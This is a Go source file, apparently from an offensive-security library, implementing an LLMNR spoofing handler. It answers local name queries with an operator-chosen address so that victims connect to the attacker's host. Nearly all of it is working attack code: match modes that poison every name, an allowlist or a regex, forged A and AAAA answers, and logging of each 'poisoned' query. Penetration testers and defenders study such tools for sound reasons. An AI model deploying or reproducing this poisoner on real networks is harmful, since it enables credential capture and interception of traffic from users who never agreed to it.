package server

import (
	"fmt"
	"net"
	"regexp"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/llmnr/llmnr_type"
	"github.com/TheManticoreProject/Manticore/network/llmnr/message"
)

// MatchMode selects how a SpoofHandler decides whether a queried name should be
// answered with a spoofed address.
type MatchMode int

const (
	// MatchAll answers every queried name (subject to own-hostname suppression).
	// This is the aggressive default an operator uses to poison a whole segment.
	MatchAll MatchMode = iota

	// MatchList answers only names present in the case-insensitive allowlist
	// (SpoofHandler.Names). Any other name is ignored so it can still be resolved
	// by a legitimate responder on the link.
	MatchList

	// MatchRegex answers only names matching the configured regular expression
	// (SpoofHandler.Regex), e.g. `^(wpad|proxy)$`.
	MatchRegex
)

// DefaultSpoofTTL is the TTL (in seconds) placed in spoofed answer records when
// no explicit TTL is configured. RFC 4795 §2.8 RECOMMENDS a default of 30
// seconds, matching what Windows LLMNR responders emit.
const DefaultSpoofTTL = 30

// SpoofConfig configures a SpoofHandler.
//
// A SpoofHandler answers LLMNR queries for names it does not own with an
// attacker-chosen address, the classic name-resolution poisoning primitive used
// to coerce a victim into connecting to the operator's host. Which names are
// answered is controlled by Mode (answer-all, an exact allowlist, or a regex),
// and the address returned is taken from SpoofIPv4/SpoofIPv6 (typically a local
// interface address so the victim connects back to the operator).
type SpoofConfig struct {
	// Mode selects the name-matching strategy (MatchAll, MatchList or MatchRegex).
	Mode MatchMode

	// Names is the case-insensitive allowlist consulted when Mode is MatchList.
	// Names are compared as single, dot-trimmed labels.
	Names []string

	// Regex is the regular expression consulted when Mode is MatchRegex. It is
	// tested against the dot-trimmed queried name.
	Regex *regexp.Regexp

	// SpoofIPv4 is the IPv4 address returned in A answers. When nil, A queries
	// are not answered regardless of AnswerA.
	SpoofIPv4 net.IP

	// SpoofIPv6 is the IPv6 address returned in AAAA answers. When nil, AAAA
	// queries are not answered regardless of AnswerAAAA.
	SpoofIPv6 net.IP

	// AnswerA and AnswerAAAA gate which query types are answered. Answering the
	// type that was asked (A for an A query, AAAA for an AAAA query) matches how
	// a real responder behaves.
	AnswerA    bool
	AnswerAAAA bool

	// TTL is the TTL (seconds) placed in answer records. Zero selects
	// DefaultSpoofTTL.
	TTL uint32

	// SuppressOwnHostname, when set, declines to answer queries for OwnHostname
	// so the poisoner does not shadow legitimate resolution of the host it runs
	// on (which is both noisy and self-defeating).
	SuppressOwnHostname bool

	// OwnHostname is the single-label hostname to suppress when
	// SuppressOwnHostname is set. It is compared case-insensitively.
	OwnHostname string

	// Verbose logs every query that is answered.
	Verbose bool
}

// SpoofHandler is an LLMNR Handler that answers matched query names with a
// spoofed address. It implements the Handler interface and is registered on a
// Server like any other handler; because the LLMNR server imposes no
// authoritative-name restriction, the handler can answer for arbitrary names,
// which is exactly what a poisoner requires.
type SpoofHandler struct {
	mode                MatchMode
	names               map[string]struct{}
	regex               *regexp.Regexp
	spoofIPv4           net.IP
	spoofIPv6           net.IP
	answerA             bool
	answerAAAA          bool
	ttl                 uint32
	suppressOwnHostname bool
	ownHostname         string
	verbose             bool
}

// NewSpoofHandler builds a SpoofHandler from cfg, validating that the
// configuration can actually answer something.
//
// It returns an error when no answerable address family is configured (neither a
// usable A nor a usable AAAA answer), when MatchList is selected with an empty
// allowlist, or when MatchRegex is selected without a compiled regex, so a
// misconfigured poisoner fails fast instead of silently answering nothing.
func NewSpoofHandler(cfg SpoofConfig) (*SpoofHandler, error) {
	h := &SpoofHandler{
		mode:                cfg.Mode,
		regex:               cfg.Regex,
		answerA:             cfg.AnswerA && cfg.SpoofIPv4 != nil,
		answerAAAA:          cfg.AnswerAAAA && cfg.SpoofIPv6 != nil,
		ttl:                 cfg.TTL,
		suppressOwnHostname: cfg.SuppressOwnHostname,
		ownHostname:         normalizeName(cfg.OwnHostname),
		verbose:             cfg.Verbose,
	}
	if h.ttl == 0 {
		h.ttl = DefaultSpoofTTL
	}
	if ip := cfg.SpoofIPv4.To4(); ip != nil {
		h.spoofIPv4 = ip
	}
	if cfg.SpoofIPv6 != nil {
		h.spoofIPv6 = cfg.SpoofIPv6.To16()
	}

	if !h.answerA && !h.answerAAAA {
		return nil, fmt.Errorf("spoof handler has no answerable address family: set AnswerA with a SpoofIPv4 and/or AnswerAAAA with a SpoofIPv6")
	}

	switch cfg.Mode {
	case MatchAll:
		// Nothing further to configure.
	case MatchList:
		if len(cfg.Names) == 0 {
			return nil, fmt.Errorf("match mode MatchList requires a non-empty name allowlist")
		}
		h.names = make(map[string]struct{}, len(cfg.Names))
		for _, name := range cfg.Names {
			h.names[normalizeName(name)] = struct{}{}
		}
	case MatchRegex:
		if cfg.Regex == nil {
			return nil, fmt.Errorf("match mode MatchRegex requires a compiled regex")
		}
	default:
		return nil, fmt.Errorf("unknown match mode %d", cfg.Mode)
	}

	return h, nil
}

// normalizeName lowercases a name and strips a single trailing dot so that
// matching is case-insensitive and insensitive to a fully-qualified trailing
// separator, mirroring how DNS/LLMNR names compare.
func normalizeName(name string) string {
	return strings.ToLower(strings.TrimSuffix(name, "."))
}

// Matches reports whether name should be answered under the handler's match
// mode and own-hostname suppression. It is exported to make the matching logic
// directly testable and reusable.
func (h *SpoofHandler) Matches(name string) bool {
	n := normalizeName(name)

	if h.suppressOwnHostname && h.ownHostname != "" && n == h.ownHostname {
		return false
	}

	switch h.mode {
	case MatchAll:
		return true
	case MatchList:
		_, ok := h.names[n]
		return ok
	case MatchRegex:
		return h.regex != nil && h.regex.MatchString(n)
	default:
		return false
	}
}

// BuildResponse assembles the spoofed response for msg without transmitting it.
//
// The returned message copies the query's transaction ID and sets the QR
// (response) flag (via CreateResponseFromMessage), then for every question whose
// name matches and whose type is one the handler answers, it appends an answer
// record carrying the configured spoof address. Each answer builder re-adds the
// corresponding question, so the response echoes the question section a real
// responder (and this project's own validating resolver) expects.
//
// It returns (nil, false) when no question matched, so the caller can leave the
// query for another handler or another responder on the link.
func (h *SpoofHandler) BuildResponse(msg *message.Message) (*message.Message, bool) {
	response := message.CreateResponseFromMessage(msg)

	answered := false
	for _, q := range msg.Questions {
		name := string(q.Name)
		if !h.Matches(name) {
			continue
		}

		switch q.Type {
		case llmnr_type.TypeA:
			if !h.answerA {
				continue
			}
			if err := response.AddAnswerClassINTypeA(name, h.spoofIPv4.String()); err != nil {
				continue
			}
		case llmnr_type.TypeAAAA:
			if !h.answerAAAA {
				continue
			}
			if err := response.AddAnswerClassINTypeAAAA(name, h.spoofIPv6.String()); err != nil {
				continue
			}
		default:
			// Only address queries are poisoned; other types are left alone.
			continue
		}

		// Override the TTL the answer builders hardcode with the configured one.
		response.Answers[len(response.Answers)-1].TTL = h.ttl
		answered = true
	}

	if !answered {
		return nil, false
	}
	return response, true
}

// Run implements the Handler interface. It builds a spoofed response for the
// incoming query and, if a name matched, unicasts it back to the querying host
// via the ResponseWriter (which directs it to the source port the query came
// from, per RFC 4795 §2.3).
//
// It returns false to stop the handler chain when the query was answered, and
// true to let subsequent handlers run when nothing matched.
func (h *SpoofHandler) Run(server *Server, remoteAddr net.Addr, writer ResponseWriter, msg *message.Message) bool {
	response, ok := h.BuildResponse(msg)
	if !ok {
		return true
	}

	if err := writer.WriteMessage(response); err != nil {
		if h.verbose {
			logger.Warnf("Failed to send spoofed LLMNR response to [%s]: %s", remoteAddr.String(), err.Error())
		}
		return false
	}

	if h.verbose {
		for _, q := range msg.Questions {
			if !h.Matches(string(q.Name)) {
				continue
			}
			switch q.Type {
			case llmnr_type.TypeA:
				if h.answerA {
					logger.Infof("Poisoned [%s] query for \"%s\" (A) -> %s", remoteAddr.String(), q.Name, h.spoofIPv4.String())
				}
			case llmnr_type.TypeAAAA:
				if h.answerAAAA {
					logger.Infof("Poisoned [%s] query for \"%s\" (AAAA) -> %s", remoteAddr.String(), q.Name, h.spoofIPv6.String())
				}
			}
		}
	}

	return false
}
